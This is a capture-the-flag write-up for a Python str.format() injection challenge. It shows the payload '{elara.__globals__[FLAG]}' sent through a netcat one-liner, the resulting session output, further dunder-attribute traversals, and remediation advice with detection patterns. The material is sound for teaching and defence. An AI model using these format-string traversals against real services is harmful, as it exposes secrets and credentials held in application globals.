# Read Me My Fortune

**Category:** Exploitation
**Challenge:** Read Me My Fortune
**CTF:** Pointer Overflow CTF 2026
**Points:** EXP 200, Wave 1
**Result:** Solved

**Flag:**

~~~text
poctf{...}
~~~

---

## 1. Reconnaissance

The challenge runs a TCP service at `read-my-fortune.pointeroverflowctf.com:9000` called "Madame Elara's Personalised Fortune Reading Service." The challenge page provides the service source code (`service.py`), a `Dockerfile`, and a `runner.sh`. A session token is required for authentication and expires every 15 minutes.

The service flow:

1. Banner and prompt for session token
2. Prompt for name
3. Prompt for star sign
4. Prompt for a "template" string with available placeholders: `{name}`, `{sign}`, `{date}`, and `{elara}`

The template is processed by Python's `str.format()` with the user-supplied values and a function object `elara` passed directly into the format context.

---

## 2. Identifying the Vulnerability

Python's `str.format()` method supports attribute access via dot notation inside format placeholders. When a function object is exposed in the formatting context, the entire module namespace becomes accessible through `__globals__`:

~~~text
{elara.__globals__[FLAG]}
~~~

This is a well-known Python format string vulnerability (CWE-134). The `str.format()` call was never intended to support arbitrary attribute traversal, but the Python specification allows it because `__globals__` is a regular dictionary attribute on function objects.

The key insight is that `elara` is not just a string placeholder; it is a live Python function object. This means `elara.__globals__` gives access to the module's global namespace, which contains the `FLAG` variable.

---

## 3. Exploitation

The exploit requires a single netcat session with three inputs: token, name, sign, and the format string payload:

~~~bash
printf 'TOKEN\nseeker\naries\n{elara.__globals__[FLAG]}\n' | \
  nc read-my-fortune.pointeroverflowctf.com 9000
~~~

Full session output:

~~~text
╭──────────────────────────────────────────────────────╮
│       M A D A M E   E L A R A ' S                    │
│       Personalised Fortune Reading Service           │
╰──────────────────────────────────────────────────────╯

  Token:
  Welcome, member of team #1391.

  What is your name?   What is your star sign?
  Template:

  ── Your Reading ─────────────────────────────────────
  poctf{...}
  ─────────────────────────────────────────────────────
~~~

The format string resolved `{elara.__globals__[FLAG]}` to the actual flag value, which was printed directly in the "reading" output.

---

## 4. Attack Flow Summary

~~~text
GET challenge page -> session token (15-min TTL)
    |
nc read-my-fortune.pointeroverflowctf.com 9000
    |
Send token -> authenticated as team #1391
    |
Name: seeker | Sign: aries
    |
Template: {elara.__globals__[FLAG]}
    |
Format string resolves FLAG from module globals
    |
FLAG displayed in the "reading" output
~~~

---

## 5. Verification

Submitted on the challenge page:

~~~text
Correct.
~~~

---

## 6. Alternative Approaches

The service source code shows that only `{name}`, `{sign}`, `{date}`, and `{elara}` are intended placeholders. Other attribute traversals worth testing in similar challenges:

- `{elara.__globals__}` to dump all global variables
- `{elara.__module__}` to identify the module name
- `{elara.__code__}` to inspect the bytecode
- `{elara.__globals__[__builtins__]}` for further introspection

For this challenge, `{elara.__globals__[FLAG]}` was sufficient for a single-shot flag recovery.

---

## 7. Tools Used

- `nc` (netcat) for TCP connection
- `printf` for non-interactive input piping
- Browser for session token retrieval

---

## MITRE ATT&CK Mapping

| Tactic | Technique | TTP-ID | Context |
|---|---|---|---|
| Execution | Command and Scripting Interpreter: Python | T1059.006 | Python str.format() exploited to traverse object attributes |
| Credential Access | Unsecured Credentials: Credentials in Files | T1552.001 | FLAG variable extracted from module globals via format string |
| Initial Access | Exploit Public-Facing Application | T1190 | TCP service vulnerable to format string injection |
| Collection | Data from Information Repositories | T1213 | Server-side secrets accessed through __globals__ traversal |

> **CWE-134:** Use of Externally-Controlled Format String. The service passes user input directly to `str.format()` with a live function object in the format context, enabling arbitrary attribute traversal.

---

## Remediation and Containment

### Technical Fixes

1. Never pass user-controlled strings to `str.format()` or `f-strings` with objects in the context
2. Use a safe templating engine (Jinja2 with sandboxed environment, `string.Template`) instead of `str.format()`
3. If `str.format()` is required, whitelist allowed placeholder names and reject any input containing `__`, `.`, or `[`
4. Move sensitive variables (flags, secrets) to environment variables or external vaults, not module-level globals

### OWASP Top 10

- **A03:2021 Injection:** format string injection through user-controlled template input

### MITRE D3FEND Countermeasures

- **D3-SICA (System Input Validation):** sanitize format string input before processing
- **D3-PSEP (Process Segment Execution Prevention):** isolate the formatting engine from sensitive module namespaces
- **D3-AL (Application Logging):** log all template inputs for forensic review

### NIST CSF 2.0

- **Protect (PR.DS):** sanitize all user-supplied input before using it in string formatting operations
- **Detect (DE.CM):** monitor for attribute traversal patterns (`__globals__`, `__class__`, `__subclasses__`) in input logs
- **Respond (RS.MI):** block and alert on inputs containing Python dunder attributes

### NIST SP 800-53 Rev. 5

- **SI-10 (Information Input Validation):** validate and sanitize all input before use in format operations
- **SC-39 (Process Isolation):** isolate sensitive data from the formatting execution context
- **AC-3 (Access Enforcement):** enforce least privilege; format context should not include function objects with __globals__ access
- **AU-6 (Audit Record Review, Analysis, and Reporting):** log format string inputs for anomaly detection

### C2M2

- **Domain:** TECHNOLOGY (Cybersecurity Architecture)
- **Practice:** Apply secure coding practices for organizational software
- **Target MIL:** MIL-2 (documented secure coding standards prohibiting unsafe string formatting)

---

Thanks guys!! (❍ᴥ❍ʋ)

---

Python format string bugs are deceptively powerful. One payload, one shot, full flag. If this walkthrough resonated with you, send it to a friend who is learning exploitation.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
